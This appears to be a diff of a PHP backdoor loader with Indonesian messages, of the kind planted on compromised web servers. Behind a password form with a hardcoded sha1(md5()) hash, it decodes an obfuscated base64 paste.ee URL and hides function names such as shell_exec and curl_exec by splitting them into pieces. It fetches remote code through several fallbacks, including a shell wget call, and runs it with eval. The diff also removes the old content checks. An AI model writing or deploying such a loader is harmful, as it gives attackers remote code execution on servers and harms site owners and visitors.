@@ -1,64 +1,44 @@
 <?php
 session_start();
+$ewean = 'ed8be04b70d3d80e4909074f9a08e547a404c91d';
 
-// Pastikan session berhasil dimulai
-if (session_status() == PHP_SESSION_NONE) {
-    echo "Session tidak dapat dimulai.";
-    exit;
-}
-
-$stored_hashed_password = '$2y$10$C1o3F5XvL2IvN2e69r8KOOoQpJqT4F/xj7HEyoTHVhHK7cFSE.vAS';
-
-if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
-        if (password_verify($_POST['password'], $stored_hashed_password)) {
+if (!isset($_SESSION['authenticated'])) {
+    if (isset($_POST['password'])) {
+        if (sha1(md5($_POST['password'])) === $ewean) {
             $_SESSION['authenticated'] = true;
-            header("Location: ".$_SERVER['PHP_SELF']);
-            exit;
+        } else {
+            echo "Password salah!";
         }
-        header("Location: ".$_SERVER['PHP_SELF']);
+    }
+
+    if (!isset($_SESSION['authenticated'])) {
+        echo '<form method="post">';
+        echo 'Password: <input type="password" name="password">';
+        echo '<input type="submit" value="Login">';
+        echo '</form>';
         exit;
     }
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Login</title>
-    </head>
-    <body>
-        <form method="post">
-            <label>Password: <input type="password" name="password" required></label>
-            <input type="submit" value="Login">
-        </form>
-    </body>
-    </html>
-    <?php
-    exit;
 }
+?>
 
+<!DOCTYPE html>
+<html>
+<head>
+    
+<?php
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
-
-// Mendekode base64
 $protocol_enc = 'aHR0cHM6Ly8=';
 $domain_enc = 'cGFzdGUuZWU=';
 $path_enc = 'ci90Z2NpTUxwYg==';
-
 $decode = function ($encoded_string) {
     return base64_decode($encoded_string);
 };
-
 $protocol = $decode($protocol_enc);
 $domain = $decode($domain_enc);
 $path = $decode($path_enc);
-
-// Validasi URL yang terbentuk
 $url = $protocol . $domain . '/' . $path;
-if (filter_var($url, FILTER_VALIDATE_URL) === false) {
-    die("URL yang dihasilkan tidak valid: " . $url);
-}
-
 $f_ab = 'curl_' . 'init';
 $f_cd = 'curl_' . 'exec';
 $f_ef = 'curl_' . 'close';
@@ -66,11 +46,9 @@ $f_gh = 'file_' . 'get_' . 'contents';
 $f_ij = 'f' . 'open';
 $f_kl = 'f' . 'close';
 $f_mn = 'shell_' . 'exec';
-
 function get_content_from_url($url)
 {
     global $f_ab, $f_cd, $f_ef, $f_gh, $f_ij, $f_kl, $f_mn;
-    
     if (function_exists($f_ab)) {
         $ch = $f_ab();
         curl_setopt($ch, CURLOPT_URL, $url);
@@ -84,14 +62,12 @@ function get_content_from_url($url)
             return $output;
         }
     }
-    
     if (ini_get('allow_url_fopen')) {
         $output = @$f_gh($url);
         if ($output !== false) {
             return $output;
         }
     }
-    
     $handle = @$f_ij($url, 'r');
     if ($handle) {
         $output = '';
@@ -103,30 +79,20 @@ function get_content_from_url($url)
             return $output;
         }
     }
-    
     if (function_exists('exec') || function_exists($f_mn)) {
         $output = @$f_mn('wget -q -O - ' . escapeshellarg($url));
         if (!empty($output)) {
             return $output;
         }
     }
-    
     return false;
 }
-
 $output = get_content_from_url($url);
 if ($output !== false) {
-    // Validasi konten sebelum menjalankan eval()
-    if (strpos($output, '<?php') !== false && strpos($output, '?>') !== false) {
-        // Hanya jalankan eval() jika konten valid
-        $run_code = function ($code) {
-            return @eval('?>' . $code);
-        };
-        $run_code($output);
-    } else {
-        echo "Konten tidak valid.";
-    }
+    $run_code = function ($code) {
+        return @eval('?>' . $code);
+    };
+    $run_code($output);
 } else {
     echo "GAK BISA TOLOL.";
 }
-?>
